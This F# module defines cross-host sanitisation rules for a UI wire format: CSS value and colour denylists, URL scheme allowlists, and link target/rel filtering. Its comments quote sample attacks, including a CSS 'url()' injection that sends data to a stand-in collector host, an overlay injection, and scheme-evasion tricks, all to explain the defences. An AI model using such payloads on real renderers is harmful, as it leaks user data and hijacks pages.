module Fuaran.UI.EmissionGrammar

// ============================================================================
//  The emission grammar for STRING-TYPED slots.
//
//  WHY THIS EXISTS, AND WHY IT LIVES HERE RATHER THAN IN THE RENDERER.
//
//  A handful of wire slots are typed `string` and carry a grammar the type does
//  not state: a CSS track-list (`grid.templateColumns`), a CSS colour or paint
//  (`drawStyle.fill` / `.stroke`), a raw CSS value (a theme's `cssRaw` colour),
//  a URL (`link.href`, `image.src`, `action.navigate.route`), and the two
//  anchor token slots (`link.target`, `link.rel`). Nothing about `string` says
//  which of those a value is, so nothing about `string` refuses a value that is
//  the wrong one.
//
//  Until this module, each rule lived at its own EMISSION SITE, per renderer,
//  per arm, by hand. Two consequences followed and both were observed:
//
//    * The hosts DISAGREED. Four server renderers concatenated `templateColumns`
//      into `style="grid-template-columns:…"` with no rule at all, while the
//      React client assigned a style OBJECT — where the browser silently drops
//      an invalid value. So `"1fr;background:url(https://collector/?d=…)"`
//      fetched on render in the server renderers, outside the egress policy,
//      and did nothing in the client. A tree vetted on one host was not safe on
//      another, which is the one property the wire format exists to provide.
//    * The REFUSAL WAS INVISIBLE. A rule applied at render time is applied after
//      decode, after `validate`, after the op-stream persisted the tree and
//      after the AI-tools surface introspected it. A model that emitted a
//      `javascript:` href was told nothing, so the demand loop counted nothing,
//      and a HEADLESS consumer — one that decodes and persists without ever
//      rendering — met no floor whatsoever.
//
//  So the grammar is declared ONCE, here, in `Fuaran.UI` beside `WireLimits`,
//  for the same reason `WireLimits` is here: it is a PROTOCOL rule, not a
//  renderer implementation detail. `WireLimits` says how big a document may be;
//  this says what a string-typed slot may contain. Both are consulted pre-emit
//  (`PreEmitValidate`, so the emitter sees the refusal) AND at every emission
//  site (`Renderer.Core.Sanitize` re-exports these, so a decoded tree that
//  never met the pre-emit pass still meets the floor).
//
//  ── FSharp.Core only, Fable-portable, allocation-light ────────────────────
//
//  Same constraints as `WireLimits`: no regular expressions (their engines
//  differ between .NET and JS, and this file's whole purpose is that the hosts
//  agree), no culture-sensitive comparison, no `System.Text.RegularExpressions`
//  under Fable. Character scans and ordinal comparison throughout.
//
//  ── The rules are DENY-SHAPED for CSS and ALLOW-SHAPED for URL and tokens ──
//
//  That asymmetry is deliberate rather than an inconsistency:
//
//    * A CSS value's grammar is genuinely open — the property set grows, the
//      function set grows, and a positive list would refuse `clamp()` the day
//      CSS shipped it. What is CLOSED is the set of characters that let a value
//      leave its declaration or reach the network, and that set is small,
//      stable and enumerable. So CSS is a character denylist, and the entry
//      point is named so that reading it says what it does NOT promise.
//    * A URL scheme set and an anchor token set are genuinely closed — every
//      member is named in a specification, and a member nobody named is a
//      member nobody vetted. So those are allowlists, and an unknown value is
//      refused rather than passed through.
// ============================================================================

open System

// Every public entry here `isNull`-tests a `string` parameter as its first act —
// the defence-in-depth floor these rules exist to be, since a hand-built or
// wire-decoded record can carry a null the type says cannot exist. F# 10's
// nullness checker rejects that test on a non-nullable `string` (FS3261). This
// project declares `<Nullable>disable</Nullable>`, but that property is the
// ENTRY project's under Fable, so a nullable-enabled entry transpiles these
// sources with nullness ON and the file stops compiling. The file-scoped
// suppression makes the posture travel with the source, exactly as
// `Renderer.Core/Sanitize.fs` does for the same reason. Do NOT drop the
// `isNull` guards — they are the contract.
#nowarn "3261"

// ─── CSS values ────────────────────────────────────────────────────────────

/// The characters a CSS VALUE may never contain, and what each one buys an
/// attacker inside `style="<property>:<value>"`.
///
///   `;`  ends the declaration — everything after it is a NEW property the
///        author never wrote (`1fr;position:fixed;top:0` is a full-viewport
///        overlay over the host's own UI).
///   `{`  `}`  end or open a RULE. Only reachable where the value lands in a
///        stylesheet rather than an attribute (a theme's `cssRaw` reaches
///        `<style>`), but the same string can reach both sinks and a rule that
///        depended on which one would be a rule nobody could apply correctly.
///   `\`  is CSS's own escape introducer: `\3b` is a semicolon the character
///        scan above would otherwise never see. Refusing the introducer is what
///        makes the rest of the list total.
///   C0   control bytes (and DEL) — parser-differential fodder, and never
///        meaningful in a value.
///
/// Two FUNCTIONS are refused by name rather than by character, because their
/// harm is not in their punctuation:
///
///   `url(`         fetches. THE finding: a value reaching a style attribute is
///                  a network request the egress policy never sees, made at
///                  RENDER time with no user act, carrying whatever the tree
///                  interpolated into it. Refused in every value, including the
///                  `fill` / `stroke` paints where it names an SVG paint server
///                  — a paint server reference and a remote fetch are the same
///                  syntax, and a rule that admitted one admits the other.
///   `expression(`  executes, on legacy engines. Dead on every current browser
///                  and refused anyway: the cost of the check is one substring
///                  scan and the cost of being wrong about which engines are
///                  still deployed is arbitrary script.
///
/// What this does NOT promise, stated because the omission is what makes the
/// rule cheap enough to apply everywhere: it is not a CSS parser and does not
/// claim the surviving string is a VALID value for the property it lands in.
/// An invalid value is dropped by the browser's own parser, which is a
/// rendering defect and not a security one. This rule bounds what a value can
/// REACH, never whether it is well-formed. The shape rules that answer the
/// second question are `isTrackList` and `isColourValue` below, and they are
/// advisory at pre-emit rather than enforced at emission for exactly that
/// reason.
let private cssForbiddenChars = [| ';'; '{'; '}'; '\\' |]

let private cssForbiddenFunctions = [| "url("; "expression(" |]

/// `true` when this string is safe to concatenate into a CSS declaration.
///
/// A null or empty value is SAFE — it contributes nothing to the declaration,
/// and refusing it would make the absence of a value indistinguishable from a
/// hostile one.
let isSafeCssValue (value: string) : bool =
    if isNull value then
        true
    else
        let mutable ok = true

        for ch in value do
            if ch < ' ' || ch = '\u007F' then
                ok <- false
            elif Array.contains ch cssForbiddenChars then
                ok <- false

        if ok then
            // The function check is case-insensitive and whitespace-tolerant on
            // the CSS side: `URL (` and `url\n(` are the same token to a CSS
            // tokenizer, so a scan for the literal lowercase spelling alone
            // would be a scan a payload walks past. Whitespace between the
            // ident and the `(` is what CSS permits, so it is what is removed
            // before the comparison.
            let sb = Text.StringBuilder(value.Length)

            for ch in value do
                if not (Char.IsWhiteSpace ch) then
                    sb.Append(Char.ToLowerInvariant ch) |> ignore

            let squashed = sb.ToString()

            cssForbiddenFunctions |> Array.forall (fun f -> not (squashed.Contains f))
        else
            false

/// The value a REFUSED CSS slot emits.
///
/// Deliberately the empty string rather than a substitute value or a
/// placeholder: an empty declaration value is dropped by every CSS parser, so
/// the element falls back to the stylesheet's own rule — which is what an
/// author who wrote nothing would have got. A substitute would be the renderer
/// inventing a layout the document never declared.
[<Literal>]
let cssRefusalValue = ""

/// The CSS value to emit: the value itself when it passes, `cssRefusalValue`
/// when it does not. The one-call seam an emission site adopts.
let sanitizeCssValue (value: string) : string =
    if isSafeCssValue value then
        (if isNull value then cssRefusalValue else value)
    else
        cssRefusalValue

/// The attribute an emission site attaches beside a refused CSS value, so the
/// refusal is visible in the DOCUMENT and not only in a log. Mirrors the egress
/// refusal marker's posture — and, like it, carries the SLOT name and never the
/// value, because a refused value is the payload.
[<Literal>]
let cssRefusalAttribute = "data-fuaran-css-refused"

// ─── CSS track-list shape (advisory) ───────────────────────────────────────

/// `true` when `value` has the SHAPE of a CSS `<track-list>` — the grammar
/// `grid-template-columns` declares.
///
/// Advisory, and deliberately loose: it admits any sequence of tokens built
/// from the characters a track list uses, so `repeat(3, minmax(10px, 1fr))`
/// and `1fr 2fr auto` both pass while `red; position:fixed` does not. It is NOT
/// the security rule — `isSafeCssValue` is — and nothing enforces it at
/// emission. Its job is to let `PreEmitValidate` tell an emitter that a value
/// it wrote will not lay anything out, at the moment the emitter can still fix
/// it.
///
/// The character set is the union of what the track-list grammar can contain:
/// idents and digits, the `%` and `.` of a length, the `(`, `)` and `,` of
/// `repeat()` / `minmax()` / `fit-content()`, the `[` `]` of a line name, and
/// whitespace. `(` is admitted here and refused by `isSafeCssValue`'s function
/// list only for the two named functions, which is why the two rules compose
/// rather than contradict.
let isTrackList (value: string) : bool =
    if isNull value || value.Trim() = "" then
        false
    else
        let admitted (c: char) =
            Char.IsLetterOrDigit c
            || c = '-'
            || c = '_'
            || c = '.'
            || c = '%'
            || c = '('
            || c = ')'
            || c = ','
            || c = '['
            || c = ']'
            || Char.IsWhiteSpace c

        value |> Seq.forall admitted

// ─── CSS colour / paint (advisory shape, closed grammar) ───────────────────

let private isHexDigit (c: char) =
    (c >= '0' && c <= '9') || (c >= 'a' && c <= 'f') || (c >= 'A' && c <= 'F')

/// The CSS colour keywords a paint slot may name, beyond the functional and
/// hex forms. Deliberately the SMALL set — the two universal keywords plus the
/// inheritance keywords — rather than the 148 named colours: a paint slot is
/// authored by a model or a designer tool, both of which emit a computed value,
/// and every named colour has a hex spelling that passes.
let private colourKeywords =
    Set.ofList [ "none"; "transparent"; "currentcolor"; "inherit"; "initial"; "unset" ]

/// The colour FUNCTIONS a paint slot may call. Closed, and closed for the
/// reason the module header gives for allowlists: a function nobody named is a
/// function nobody vetted, and `url()` — the paint-server spelling that is also
/// the fetch spelling — is exactly what is being excluded by naming the rest.
let private colourFunctions =
    [| "rgb("
       "rgba("
       "hsl("
       "hsla("
       "oklch("
       "oklab("
       "lch("
       "lab("
       "color(" |]

/// `true` when `value` is a CSS colour in one of the closed forms: a `#rgb` /
/// `#rrggbb` / `#rrggbbaa` hex, one of the keywords, or a call to one of the
/// named colour functions.
///
/// This is the rule the finding asked for on `DrawStyle.fill` / `.stroke`,
/// where a paint slot accepted `url(…)` and therefore accepted an arbitrary
/// remote fetch at render time. Note the two rules stack rather than substitute:
/// a paint value must pass `isSafeCssValue` (so it cannot leave its
/// declaration) AND be a colour (so it cannot fetch). Passing only the first is
/// what let `url(https://collector/x)` through, since it contains no forbidden
/// character — which is why the paint slots need a positive grammar and a
/// generic CSS value does not.
let isColourValue (value: string) : bool =
    if isNull value then
        false
    else
        let t = value.Trim()

        if t = "" then
            false
        elif t.StartsWith("#", StringComparison.Ordinal) then
            let digits = t.Substring 1

            (digits.Length = 3 || digits.Length = 4 || digits.Length = 6 || digits.Length = 8)
            && digits |> Seq.forall isHexDigit
        else
            let lower = t.ToLowerInvariant()

            colourKeywords.Contains lower
            || ((colourFunctions
                 |> Array.exists (fun f -> lower.StartsWith(f, StringComparison.Ordinal)))
                && lower.EndsWith(")", StringComparison.Ordinal)
                && isSafeCssValue t)

/// The paint value to emit: the value when it is a colour, `"none"` when it is
/// not.
///
/// `"none"` rather than the empty string, because these two slots reach an SVG
/// `fill` / `stroke` attribute where an EMPTY value inherits the parent's paint
/// instead of clearing it — so an empty refusal would silently paint the shape
/// with whatever the enclosing group declared, which is a different picture
/// rather than an absent one.
let sanitizePaintValue (value: string) : string =
    if isColourValue value then value.Trim() else "none"

// ─── URL scheme floor ──────────────────────────────────────────────────────
//
//  Moved here from the renderer's `Sanitize` so a HEADLESS consumer — one that
//  decodes, validates and persists without ever constructing a renderer — meets
//  the same floor, and so `PreEmitValidate` can name the refusal before any
//  renderer runs. `Renderer.Core.Sanitize` re-exports every function below
//  under its established names, so no emission site changed and no consumer's
//  `open` moved.

/// Schemes a `href` / `src` may declare.
let allowedUrlSchemes =
    Set.ofList [ "http"; "https"; "mailto"; "tel"; "ftp"; "sftp" ]

/// Schemes ALWAYS refused, whatever a caller intends.
let rejectedUrlSchemes = Set.ofList [ "javascript"; "vbscript"; "file" ]

let private trimAndLower (s: string) : string = s.Trim().ToLowerInvariant()

/// §19 rule 1 — the WHATWG URL Standard's own pre-parse normalisation, ASCII-
/// exact, in this order: (1) remove leading and trailing C0-or-space — ALL of
/// U+0000–U+0020, not merely the whitespace subset; (2) remove every U+0009 /
/// U+000A / U+000D from anywhere in what remains.
///
/// Deliberately NOT `String.Trim()`. A native trim answers a different question
/// in every language — .NET, JS, Go and Rust leave U+001C–U+001F where Python
/// removes them; JS keeps U+0085 where the other four drop it — and all of them
/// remove non-ASCII whitespace (U+00A0, U+2028, …) that the parser keeps. The
/// floor's whole purpose is that a tree vetted on one host is safe on another,
/// so the normalisation is defined by the parser that will actually consume the
/// string rather than by the host's standard library.
///
/// Step 2 is those three code points ONLY: the parser removes U+000B and U+000C
/// at the edges (step 1) and KEEPS them in the interior, so `/<VT>/host/x` is an
/// ordinary same-origin path and must stay one.
let normalizeUrlForFloor (s: string) : string =
    if isNull s then
        ""
    else
        let isC0OrSpace (c: char) = c <= ' '
        let mutable lo = 0
        let mutable hi = s.Length - 1

        while lo <= hi && isC0OrSpace s[lo] do
            lo <- lo + 1

        while hi >= lo && isC0OrSpace s[hi] do
            hi <- hi - 1

        let sb = Text.StringBuilder(hi - lo + 1)

        for i in lo..hi do
            match s[i] with
            | '\t'
            | '\n'
            | '\r' -> ()
            | c -> sb.Append c |> ignore

        sb.ToString()

/// Split a URL into `(schemeOpt, rest)`. A URL without a `:` before any `/`,
/// `?` or `#` (a relative path, a fragment, an empty string) returns
/// `(None, url)`.
///
/// Whitespace and control characters inside the scheme region defeat the match
/// — `java\tscript:` is a classic evasion of a naive prefix check — so the
/// scheme candidate is stripped of everything at or below U+0020 before it is
/// classified, and lowercased.
let extractScheme (url: string) : string option * string =
    if isNull url then
        None, ""
    else
        let mutable colonIdx = -1
        let mutable slashIdx = -1
        let mutable i = 0

        while i < url.Length && colonIdx < 0 && slashIdx < 0 do
            let ch = url[i]

            if ch = ':' then
                colonIdx <- i
            elif ch = '/' || ch = '?' || ch = '#' then
                slashIdx <- i

            i <- i + 1

        if colonIdx < 0 || (slashIdx >= 0 && slashIdx < colonIdx) then
            None, url
        else
            let raw = url.Substring(0, colonIdx)

            let cleaned =
                raw |> Seq.filter (fun ch -> int ch > 0x20) |> Seq.toArray |> System.String

            Some(trimAndLower cleaned), url

/// `true` when a schemeless URL is PROTOCOL-RELATIVE — it starts with two
/// slash-ish characters, in any mix of `/` and `\`.
///
/// All four spellings (`//host`, `/\host`, `\\host`, `\/host`) resolve
/// off-origin, because WHATWG URL parsing treats `\` as `/` for a special
/// scheme: the browser normalises the pair to `//` and reads what follows as an
/// AUTHORITY, not a path.
///
/// A SINGLE leading backslash (`\evil.example`) is deliberately not caught: the
/// same rule reads it as `/evil.example`, an ordinary same-origin path, which is
/// exactly what the `/`-spelling is allowed to be.
let isProtocolRelative (url: string) : bool =
    let slashish (c: char) = c = '/' || c = '\\'
    url.Length >= 2 && slashish url[0] && slashish url[1]

/// Returns the normalised URL, or `None` when its scheme is refused.
let sanitizeUrl (url: string) : string option =
    if isNull url then
        None
    else
        let trimmed = normalizeUrlForFloor url

        if trimmed = "" then
            Some trimmed
        else
            match extractScheme trimmed with
            | None, _ when isProtocolRelative trimmed -> None
            | None, _ -> Some trimmed
            | Some scheme, _ when rejectedUrlSchemes.Contains scheme -> None
            | Some scheme, _ when allowedUrlSchemes.Contains scheme -> Some trimmed
            | Some _, _ -> None

/// Why a URL failed the scheme floor — the pre-emit vocabulary, so an advisory
/// can say WHICH rule refused rather than only that one did.
///
/// It is a DU rather than a message string because the pre-emit layer is read
/// by a model: `RejectedScheme "javascript"` is a fact a repair can act on
/// ("use an `Action` instead of a `javascript:` href"), where "unsafe URL" is
/// a fact it can only guess at.
[<RequireQualifiedAccess>]
type UrlRefusal =
    /// The scheme is on the always-refused list (`javascript:`, `vbscript:`,
    /// `file:`). The most actionable case: it names an intent the wire has a
    /// typed slot for.
    | RejectedScheme of scheme: string
    /// The scheme parsed but is not allowlisted. Distinct from the above
    /// because the remedy differs — an unknown scheme is a host-allowlist
    /// question, a rejected one never is.
    | UnknownScheme of scheme: string
    /// A schemeless URL that begins `//` (in any `/` `\` mix) and therefore
    /// leaves the origin despite naming no scheme.
    | ProtocolRelative

/// The refusal reason, or `None` when the URL passes. Same decision as
/// `sanitizeUrl`, reported rather than applied.
let classifyUrlRefusal (url: string) : UrlRefusal option =
    if isNull url then
        None
    else
        let trimmed = normalizeUrlForFloor url

        if trimmed = "" then
            None
        else
            match extractScheme trimmed with
            | None, _ when isProtocolRelative trimmed -> Some UrlRefusal.ProtocolRelative
            | None, _ -> None
            | Some scheme, _ when rejectedUrlSchemes.Contains scheme -> Some(UrlRefusal.RejectedScheme scheme)
            | Some scheme, _ when allowedUrlSchemes.Contains scheme -> None
            | Some scheme, _ -> Some(UrlRefusal.UnknownScheme scheme)

/// The wire spelling of a refusal — what an advisory's message names and what a
/// demand-loop census counts.
let describeUrlRefusal (r: UrlRefusal) : string =
    match r with
    | UrlRefusal.RejectedScheme s -> "rejected scheme '" + s + ":'"
    | UrlRefusal.UnknownScheme s -> "unrecognised scheme '" + s + ":'"
    | UrlRefusal.ProtocolRelative -> "protocol-relative reference (leaves the origin with no scheme)"

// ─── Anchor token slots — `target` and `rel` ───────────────────────────────
//
//  Both are free strings on the wire today. The narrowing of the WIRE is a §4b
//  amendment PROPOSAL (`docs/proposals/link-target-rel-narrowing.md`) and is
//  deliberately not applied by any decoder in this change-set: refusing a
//  document that every conformant host accepts today is irreversible, and the
//  proposal is the route the estate takes for such a change. What IS applied,
//  here and now, is the EMISSION rule — every renderer emits only what these
//  functions return — plus a pre-emit advisory, so the refusal is visible to an
//  emitter and countable by the demand loop long before any decoder narrows.

/// The two `target` values a Fuaran link may carry.
///
/// `_self` and `_blank` only. The three the HTML specification also defines are
/// each refused for their own reason, and none of them is an oversight:
///
///   `_parent` / `_top` — meaningful only when the document is FRAMED, and a
///        framed Fuaran document navigating its embedder is precisely the
///        frame-busting an embedding host did not consent to.
///   a NAMED frame — the finding. `target="victim"` addresses a browsing
///        context BY NAME, so a decoded tree can navigate a window it did not
///        create and whose contents it cannot see, and the name is a free
///        string with no way for a host to enumerate what it might hit.
let allowedLinkTargets = Set.ofList [ "_self"; "_blank" ]

/// The `rel` tokens a Fuaran link may carry, as a closed set.
///
/// Every member is a token that describes THIS link's relationship to its
/// destination and changes nothing about the opener's capabilities in the wrong
/// direction. The one deliberate absence is the finding: `opener` RE-ENABLES
/// `window.opener` on a `_blank` link, handing the opened document a live
/// reference to the opening one — which is the capability `noopener` exists to
/// remove and which no rendered tree has any reason to ask for.
let allowedLinkRelTokens =
    Set.ofList
        [ "alternate"
          "author"
          "bookmark"
          "external"
          "help"
          "license"
          "next"
          "nofollow"
          "noopener"
          "noreferrer"
          "prev"
          "privacy-policy"
          "search"
          "tag"
          "terms-of-service"
          "ugc" ]

/// The `target` to emit, or `None` to omit the attribute.
///
/// An unrecognised value degrades to `None` — omitting the attribute — rather
/// than to `_self`. The two are the same navigation, and omitting says
/// truthfully that the document declared nothing this renderer could honour,
/// where substituting would put a value in the DOM the author never wrote.
let sanitizeLinkTarget (target: string) : string option =
    if isNull target then
        None
    else
        let t = target.Trim().ToLowerInvariant()
        if allowedLinkTargets.Contains t then Some t else None

/// The `rel` token list to emit, given the declared `rel` and the SANITISED
/// target. Two rules, in order:
///
///   1. Every declared token not in the closed set is dropped. Tokens are
///      whitespace-separated and case-insensitive per HTML, so they are
///      normalised before the test — `NoOpener` and `noopener` are one token.
///   2. `noopener` and `noreferrer` are FORCED when the target is `_blank`,
///      whether or not the document asked for them, and whether or not it
///      declared a `rel` at all.
///
/// Rule 2 is the one that closes the finding. Modern browsers imply `noopener`
/// on `target="_blank"`, which is exactly why the omission is dangerous rather
/// than merely untidy: the behaviour is a browser DEFAULT, an explicit
/// `rel="opener"` overrides it, and the version floor at which the default
/// arrived is not something a document can know about its reader. Emitting the
/// tokens makes the property a fact about the document rather than a fact about
/// the user agent.
///
/// The result is ORDERED — declared-and-surviving tokens first, in their
/// declared order, then the forced pair if absent — so two hosts given one
/// document emit one byte sequence. An unordered set would make cross-host
/// byte parity impossible to state, let alone to test.
let sanitizeLinkRel (rel: string option) (sanitizedTarget: string option) : string list =
    let declared =
        match rel with
        | None -> []
        | Some r when isNull r -> []
        | Some r ->
            r.Split([| ' '; '\t'; '\n'; '\r'; '\f' |], StringSplitOptions.RemoveEmptyEntries)
            |> Array.map (fun t -> t.ToLowerInvariant())
            |> Array.filter allowedLinkRelTokens.Contains
            |> Array.distinct
            |> Array.toList

    let forced =
        if sanitizedTarget = Some "_blank" then
            [ "noopener"; "noreferrer" ]
            |> List.filter (fun t -> not (List.contains t declared))
        else
            []

    declared @ forced

/// The `rel` ATTRIBUTE VALUE to emit, or `None` to omit the attribute.
/// `sanitizeLinkRel` joined on a single space — the one-call seam an emission
/// site adopts.
let sanitizeLinkRelAttribute (rel: string option) (sanitizedTarget: string option) : string option =
    match sanitizeLinkRel rel sanitizedTarget with
    | [] -> None
    | tokens -> Some(System.String.Join(" ", tokens))
